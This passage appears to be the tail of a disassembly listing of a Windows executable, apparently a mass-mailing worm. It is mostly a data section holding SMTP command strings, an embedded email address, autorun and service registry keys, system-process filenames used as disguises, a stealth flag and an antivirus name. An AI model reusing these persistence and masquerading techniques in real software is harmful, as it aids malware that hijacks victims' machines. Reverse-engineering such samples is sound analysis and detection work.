					; DATA XREF: sub_4019FF+33Ao
		db 9,'name="',0
		align 4
; char aData[]
aData		db 'DATA',0Dh,0Ah,0     ; DATA XREF: sub_4019FF+2DBo
		align 4
; char aRcptTo[]
aRcptTo		db 'RCPT TO: <',0       ; DATA XREF: sub_4019FF+284o
		align 4
; char asc_407C98[]
asc_407C98	db '>',0Dh,0Ah,0        ; DATA XREF: sub_4019FF+24Do
					; sub_4019FF+2A4o
; char aMailFrom[]
aMailFrom	db 'MAIL FROM: <',0     ; DATA XREF: sub_4019FF+22Do
		align 4
; char aHelo[]
aHelo		db 'HELO ',0            ; DATA XREF: sub_4019FF+1D6o
		align 4
; char aEhlo[]
aEhlo		db 'EHLO ',0            ; DATA XREF: sub_4019FF+182o
		align 4
; char asc_407CBC[]
asc_407CBC	db '\',0                ; DATA XREF: sub_4025E9+9Ao
					; sub_402770+4Do
		align 10h
; char a__0[]
a__0		db '\*.*',0             ; DATA XREF: sub_4025E9+1Fo
		align 4
aWindowsService	db 'Windows Services Host',0 ; DATA XREF: sub_402770+1C5o
					; sub_402770+1D1o
		align 10h
; char aSystemCurrentc[]
aSystemCurrentc	db 'System\CurrentControlSet\Services\WksPatch ',0
					; DATA XREF: sub_402770+1B9o
; char aSoftwareMicr_1[]
aSoftwareMicr_1	db 'Software\Microsoft\Windows\CurrentVersion\Explorer\PINF',0
					; DATA XREF: sub_402770+1ADo
aSentry		db 'Sentry',0           ; DATA XREF: sub_402770+19Eo
		align 4
aOle		db 'OLE',0              ; DATA XREF: sub_402770+192o
aService	db 'service',0          ; DATA XREF: sub_402770+186o
aAu_exe		db 'au.exe',0           ; DATA XREF: sub_402770+17Ao
		align 10h
aD3dupdate_exe	db 'd3dupdate.exe',0    ; DATA XREF: sub_402770+16Eo
		align 10h
aDeleteMe	db 'DELETE ME',0        ; DATA XREF: sub_402770+15Fo
		align 4
aMsgsvr32	db 'msgsvr32',0         ; DATA XREF: sub_402770+153o
		align 4
aSoftwareMicr_0	db 'SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices',0
					; DATA XREF: sub_402770+148o
		align 10h
aSystem_	db 'system.',0          ; DATA XREF: sub_402770+137o
					; sub_402770+143o
aKasperskyav	db 'KasperskyAv',0      ; DATA XREF: sub_402770+11Fo
					; sub_402770+12Bo
; char aClsidE6fb5e20D[]
aClsidE6fb5e20D	db 'CLSID\{E6FB5E20-DE35-11CF-9C87-00AA005127ED}\InProcServer32',0
					; DATA XREF: sub_402770+10Fo
aExplorer	db 'Explorer',0         ; DATA XREF: sub_402770+F4o
					; sub_402770+100o
		align 4
aTaskmon	db 'Taskmon',0          ; DATA XREF: sub_402770+DAo
; char ValueName[]
ValueName	db 'ICQ Net',0          ; DATA XREF: sub_402770+C3o
; char SubKey[]
SubKey		db 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0
					; DATA XREF: sub_402770+98o
		align 4
; char aStealth[]
aStealth	db ' -stealth',0        ; DATA XREF: sub_402770+88o
		align 4
; char aWinlogon_exe[]
aWinlogon_exe	db 'winlogon.exe',0     ; DATA XREF: sub_402770+60o
		align 4
; char aSkoorpio@yahoo[]
aSkoorpio@yahoo	db 'skoorpio@yahoo.com',0 ; DATA XREF: WinMain(x,x,x,x)+69o
		align 10h
off_407E90	dd offset __exit	; DATA XREF: __amsg_exit+1Cr
dword_407E94	dd 2			; DATA XREF: __FF_MSGBANNER+Er
					; __NMSG_WRITE+46r
dword_407E98	dd 407EA2h		; DATA XREF: _isdigit+1Br
					; __isctype+12r ...
		dd offset __ctype+2
		public __ctype
; unsigned __int16 _ctype[]
__ctype		dd    200000h		; DATA XREF: _x_ismbbtype+18r
					; C:00407E9Co
		unicode	0, <	    (((((		   H>
		dd 7 dup(100010h), 840010h, 4 dup(840084h), 100084h, 3 dup(100010h)
		dd 3 dup(810081h), 0Ah dup(10001h), 3 dup(100010h), 3 dup(820082h)
		dd 0Ah dup(20002h), 2 dup(100010h), 20h, 40h dup(0)
dword_4080A4	dd 1			; DATA XREF: _isdigitr
		dd 2Eh,	1
dword_4080B0	dd 0C0000005h		; DATA XREF: _xcptlookup+Ar
					; _xcptlookup+11o
		dd 0Bh,	0, 0C000001Dh, 4, 0, 0C0000096h, 4, 0, 0C000008Dh
		dd 8, 0, 0C000008Eh, 8,	0, 0C000008Fh, 8, 0, 0C0000090h
		dd 8, 0, 0C0000091h, 8,	0, 0C0000092h, 8, 0, 0C0000093h
		dd 8, 0
dword_408128	dd 3			; DATA XREF: __XcptFilter+58r
dword_40812C	dd 7			; DATA XREF: __XcptFilter+5Er
dword_408130	dd 0Ah			; DATA XREF: _xcptlookup+4r
dword_408134	dd 8Ch			; DATA XREF: __XcptFilter+82r
					; __XcptFilter+8Fw ...
		dd 0FFFFFFFFh, 0A00h, 10h
dword_408144	dd 19930520h, 4	dup(0)	; DATA XREF: A:00404037o
					; __NLG_Notify+2o
dword_408158	dd 2			; DATA XREF: __NMSG_WRITE+Eo
					; __NMSG_WRITE+28r
dword_40815C	dd 406424h		; DATA XREF: __NMSG_WRITE+FCr
					; __NMSG_WRITE+12Dr
		dd 8, 4063F8h, 9, 4063CCh, 0Ah,	4063A8h, 10h, 40637Ch
		dd 11h,	40634Ch, 12h, 406328h, 13h, 4062FCh, 18h, 4062C4h
		dd 19h,	40629Ch, 1Ah, 406264h, 1Bh, 40622Ch, 1Ch, 406204h
		dd 78h,	4061F4h, 79h, 4061E4h, 7Ah, 4061D4h, 0FCh, 407A78h
		dd 0FFh, 4061C4h
dword_4081E8	dd 3F8h			; DATA XREF: __heap_alloc+5r
					; __NMSG_WRITE+1Bo
		align 10h
byte_4081F0	db 1			; DATA XREF: __setmbcp+E1r
		dd 80402h
		align 4
dword_4081F8	dd 3A4h			; DATA XREF: __setmbcp+2Fo
dword_4081FC	dd 82798260h		; DATA XREF: __setmbcp+11Dr
		dd 21h,	0
dword_408208	dd 0DFA6h		; DATA XREF: __setmbcp+C0r
		align 10h
		dd 0A5A1h, 0, 0FCE09F81h, 0, 0FC807E40h, 0, 3A8h, 0A3DAA3C1h
		dd 20h,	5 dup(0), 0FE81h, 0, 0FE40h, 0,	3B5h, 0A3DAA3C1h
		dd 20h,	5 dup(0), 0FE81h, 0, 0FE41h, 0,	3B6h, 0A2E4A2CFh
		dd 0A2E5001Ah, 5BA2E8h,	4 dup(0), 0FE81h, 0, 0FEA17E40h
		dd 0, 551h, 0DA5EDA51h,	0DA5F0020h, 32DA6Ah, 4 dup(0)
		dd 0DED8D381h, 0F9E0h, 0FE817E31h, 0
dword_4082E8	dd 2 dup(0)		; DATA XREF: __setmbcp+3Co
dword_4082F0	dd 0			; DATA XREF: sub_4029C9+41r
					; sub_4029C9+48r ...
		dd 43h dup(0)
		dd 9BCh	dup(?)
dword_40AAF0	dd ?			; DATA XREF: sub_4019FF+14Dr
					; sub_4021B2+37o ...
		dd 283Fh dup(?)
dword_414BF0	dd ?			; DATA XREF: sub_401910r
					; sub_401910+10w ...
dword_414BF4	dd ?			; DATA XREF: WinMain(x,x,x,x)+25w
dword_414BF8	dd ?			; DATA XREF: sub_4019FF+147r
					; sub_4021B2+25r ...
; const	CHAR word_414BFC
word_414BFC	dw ?			; DATA XREF: sub_402145+14o
					; sub_402235+BBr ...
		db 2 dup(?)
; char *dword_414C00
dword_414C00	dd ?			; DATA XREF: start+84w
					; __setenvp:loc_40395Br ...
		dd ?
dword_414C08	dd ?			; DATA XREF: __amsg_exitr
					; _fast_error_exitr ...
		dd 3 dup(?)
dword_414C18	dd ?			; DATA XREF: start+52w
dword_414C1C	dd ?			; DATA XREF: start+49w
dword_414C20	dd ?			; DATA XREF: start+3Ew
dword_414C24	dd ?			; DATA XREF: start+30w
dword_414C28	dd ?			; DATA XREF: __setargv+91w
dword_414C2C	dd ?			; DATA XREF: __setargv+89w
		dd ?
dword_414C34	dd ?			; DATA XREF: __setenvp+44w
		dd 3 dup(?)
dword_414C44	dd ?			; DATA XREF: __setargv+2Ew
		dd ?
byte_414C4C	db ?			; DATA XREF: _doexit+2Dw
		db 3 dup(?)
dword_414C50	dd ?			; DATA XREF: _doexit+27w
dword_414C54	dd ?			; DATA XREF: _doexit+4r _doexit+8Bw
dword_414C58	dd ?			; DATA XREF: __XcptFilter+3Ar
					; __XcptFilter+46w ...
; char Filename[]
Filename	db 104h	dup(?)		; DATA XREF: __setargv:loc_403A19o
dword_414D60	dd ?			; DATA XREF: ___crtGetEnvironmentStringsA+2r
					; ___crtGetEnvironmentStringsA+23w ...
dword_414D64	dd ?			; DATA XREF: __FF_MSGBANNER+21r
dword_414D68	dd ?			; DATA XREF: _mallocr
dword_414D6C	dd ?			; DATA XREF: __callnewhr
dword_414D70	dd ?			; DATA XREF: ___crtGetStringTypeA+26r
					; ___crtGetStringTypeA:loc_404B92w
dword_414D74	dd ?			; DATA XREF: __setmbcp:loc_404E2Er
					; _getSystemCP+4w ...
dword_414D78	dd ?			; DATA XREF: ___crtMessageBoxA+3r
					; ___crtMessageBoxA+2Ew ...
dword_414D7C	dd ?			; DATA XREF: ___crtMessageBoxA+43w
					; ___crtMessageBoxA:loc_4050E2r
dword_414D80	dd ?			; DATA XREF: ___crtMessageBoxA+4Aw
					; ___crtMessageBoxA+60r
		dd 2 dup(?)
; LCID Locale
Locale		dd ?			; DATA XREF: ___crtGetStringTypeA+7Br
		dd 3 dup(?)
dword_414D9C	dd ?			; DATA XREF: ___crtGetStringTypeA+A6r
					; _getSystemCP+3Ar ...
		dd ?
dword_414DA4	dd ?			; DATA XREF: ___crtLCMapStringA+28r
					; ___crtLCMapStringA+4Cw ...
; UINT CodePage
CodePage	dd ?			; DATA XREF: __setmbcp+14r
					; __setmbcp+65w ...
		dd ?
dword_414DB0	dd 3 dup(?)		; DATA XREF: __setmbcp+123o
					; __setmbcp+171o ...
dword_414DBC	dd ?			; DATA XREF: __setmbcp+108w
					; __setmbcp+15Dw ...
byte_414DC0	db ?			; DATA XREF: _setSBUpLow:loc_404FFEw
					; _setSBUpLow:loc_40501Bw ...
		dd 3Fh dup(?)
		db 3 dup(?)
byte_414EC0	db ?			; DATA XREF: __setmbcp+5Co
					; __setmbcp+AFo ...
byte_414EC1	db ?			; DATA XREF: _parse_cmdline+3Fr
					; _parse_cmdline+84r ...
		dd 40h dup(?)
		db 2 dup(?)
dword_414FC4	dd ?			; DATA XREF: __setmbcp+6Ew
					; __setmbcp+12Bw ...
dword_414FC8	dd ?			; DATA XREF: ___sbh_heap_init+32w
					; ___sbh_alloc_new_region+5r ...
dword_414FCC	dd ?			; DATA XREF: ___sbh_free_block+239r
					; ___sbh_free_block+259r ...
dword_414FD0	dd ?			; DATA XREF: ___sbh_heap_init+2Dw
					; ___sbh_free_block+310w ...
dword_414FD4	dd ?			; DATA XREF: ___sbh_heap_init:loc_4042FCw
					; ___sbh_free_block+22Cr ...
dword_414FD8	dd ?			; DATA XREF: ___sbh_heap_init+24w
					; ___sbh_find_blockr ...
; LPVOID lpMem
lpMem		dd ?			; DATA XREF: ___sbh_heap_init+15w
					; ___sbh_find_block+8r	...
; HANDLE hHeap
hHeap		dd ?			; DATA XREF: __heap_alloc+28r
					; _free+21r ...
		dd 7 dup(?)
dword_415000	dd ?			; DATA XREF: __ioinit:loc_403DA1w
					; __ioinit+45r	...
dword_415004	dd 3Fh dup(?)		; DATA XREF: __ioinit+92o
; UINT uNumber
uNumber		dd ?			; DATA XREF: __ioinit+26w
					; __ioinit:loc_403E0Br	...
dword_415104	dd ?			; DATA XREF: __setenvp+ADw
dword_415108	dd ?			; DATA XREF: __wincmdlnr __setenvp+3r	...
dword_41510C	dd ?			; DATA XREF: _doexit+3Er
dword_415110	dd ?			; DATA XREF: _doexit+35r _doexit+57r
dword_415114	dd ?			; DATA XREF: __cinitr
dword_415118	dd ?			; DATA XREF: start+7Aw	__wincmdln+Fr ...
		dd 3B9h	dup(?)
C		ends

; Section 4. (virtual address 00016000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00006C00
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
D		segment	para public 'CODE' use32
		assume cs:D
		;org 416000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
		dd 80h dup(0)
		dd 380h	dup(?)
D		ends


		end start
